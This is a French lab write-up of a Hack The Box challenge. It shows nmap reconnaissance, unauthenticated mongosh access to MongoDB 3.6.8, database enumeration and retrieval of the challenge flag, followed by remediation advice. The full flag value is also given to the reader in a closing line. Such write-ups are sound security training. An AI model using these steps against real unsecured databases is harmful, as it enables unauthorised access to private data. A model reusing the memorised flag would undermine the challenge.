```markdown
# Rapport : accès non authentifié à MongoDB (HTB)

Cible : 10.129.228.30
Date : 09/10/2026
Environnement : lab HTB autorisé

## 1. Reconnaissance

```bash
nmap 10.129.228.30
nmap -p- -sV -sC 10.129.228.30
```

Résultat : ports 22 (OpenSSH 8.2p1) et 27017 (MongoDB 3.6.8) ouverts. Le script `mongodb-databases` liste les bases sans identifiants.

## 2. Installation

```bash
sudo apt update
sudo apt install -y nodejs npm
sudo npm install -g mongosh@1.10.6
mongosh --version
```

`mongosh` 1.10.6 est utilisé car les versions 2.x ne se connectent pas à un serveur MongoDB 3.6.

## 3. Exploitation

Connexion sans authentification :

```bash
mongosh "mongodb://10.129.228.30:27017/sensitive_information"
```

Énumération dans le shell :

```
show dbs
use users
show collections
db.ecommerceWebapp.countDocuments()
db.ecommerceWebapp.findOne()
use sensitive_information
show collections
db.flag.countDocuments()
db.flag.find({}, {_id: 0})
exit
```

## 4. Preuve

- Bases visibles : admin, config, local, sensitive_information, users
- users.ecommerceWebapp : 25 documents
- sensitive_information.flag : 1 document
- Flag : 1b6e6fb359e7c40241b6d431427ba6ea
- Le serveur confirme : "Access control is not enabled for the database"

## 5. Impact

N'importe quel acteur ayant accès au réseau peut lire toutes les bases, y compris celle nommée sensitive_information, sans identifiant.

## 6. Remédiation

- Activer l'authentification : `security.authorization: enabled`
- Créer des utilisateurs avec des droits minimaux (moindre privilège)
- Limiter l'écoute : `net.bindIp: 127.0.0.1` ou un réseau interne
- Filtrer le port 27017 au pare-feu
- Migrer vers une version MongoDB maintenue (3.6 est en fin de vie)
- Activer TLS pour les connexions
```

Tu peux soumettre `1b6e6fb359e7c40241b6d431427ba6ea` dans le champ prévu sur HTB.